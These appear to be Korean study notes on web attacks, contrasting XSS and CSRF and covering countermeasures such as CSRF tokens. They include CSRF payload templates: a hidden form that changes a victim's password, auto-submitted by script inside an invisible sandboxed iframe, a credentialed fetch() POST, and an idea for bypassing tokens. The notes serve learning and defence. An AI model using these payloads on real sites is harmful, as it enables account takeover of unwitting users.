xss를 이용해서 고객정보, 마이페이지의 중요정보를 탈취하는 공격




-------------

CSRF
> 찾으려하면 찾게되는 취약점
> Cross Site Request Forgery  요청을 위조하는 공격
>> 피해자가 내가 원하는 대로 서버에 뭔가를 보냈으면 좋겠다

마이페이지에서 비밀번호를 변경시 넘어가는 파라미터가 있는 URL을 클릭하게 하면됨



XSS / CSRF 차이
XSS
> 클라이언트 측 스크립트를 삽입하는 공격

CSRF
> 피해자가 서버로 임의의 요청을 보내게하는 공격



CSRF 대응방안
공격자가 모르는 값을 추가함
> 비밀번호 변경시 변경될 비밀번호와 변경전 비밀번호를 같이 쓰게 할 수 있음
>> XSS를 같이 이용시 궁합이 좋아서 더 위험해짐
>> 게시판에 img태그로 csrf 공격 주소를 넣으면 게시글을 클릭시 바로 적용됨


CSRF는 모든 요청에서 일어남.



CSRF와 XSS 융합
GET방식이라 위험해요..!
> POST방식이여도 위험함
>> POST방식이라고 대응법이 되지않음
>> POST방식은 XSS가 있어야하는 조건이 있음

과거엔 쿠키고 세션이고 중요하게 생각하지않음
> 사이트의 쿠키를 다른사이트에서도 사용이 됬음
>> form 태그를 써서 다른 사람의 정보를 얻을 수 있었음

<form method="POST" action="공격 주소" id="csrfform" target="iframe Id">
<input type"hidden" name="id" />
<input type"hidden" name="info" />
<input type"hidden" name="pw" value="qwas" />
<button type="submit">클릭</button>
</form>

이렇게 form태그로 CSRF를 유도할 수 있음
그래서 버튼 클릭시 비밀번호 변경시킬 값을 보냄

script태그를 넣어서 자동으로 버튼을 누르게 할 수 있음

<script>
document.getElementById('form id값').submit():
</script>


이렇게 하면 자동으로 버튼까지 눌러줘서 요청이 넘어가 비밀번호가 바뀜


iframe로 form을 넣을 수 있음
<iframe width="0" height="0" border="0" name="frame" id="frameId" style="display: none;" sandbox="allow-forms">
</iframe>

이렇게 iframe를 하면 form의 값이 iframe로 들어감
sandbox의 값이 있으면 iframe에서 일어나는 자바스크립트를 없애서
정보수정시 뜨는 alert를 막을 수 있음
> 즉 게시글 클릭시 아무것도 보이진 않지만 버프로 보면 변경되어버린 값이 넘어간걸 확인이 가능함


form 태그없이 script로만으로 가능

<script>
fetch("공격 주소", {
method: "POST",
headers: {
"Content-Type": "application/x-www-form-urlencoded"
},
body: "넘어갈 파라미터",
credentials: "include"
});
</script>

이렇게 가능
fetch로 POST방식으로 넘어가게 할 수 있음

두가지로 나뉜 이유는 상황에 따라 form / script 를 맞게 골라서 써야함



CSRF 대응방안
> CSRF TOKEN
>> CSRF를 막을 페이지에 넣어둠 (input으로 안보이게)
만약 유저정보페이지라면 비밀번호 변경시 토큰과 같이 보냄
> iframe으로 다른 페이지의 정보를 얻고 form태크로 변경할 비밀번호와 얻은 토큰을 보낼 수 있음


>> 좀 불안정한 대응법
>> 많이 중요한 곳엔 제대로 대처하지만 그게 아닌 곳엔 CSRF토큰을 사용함
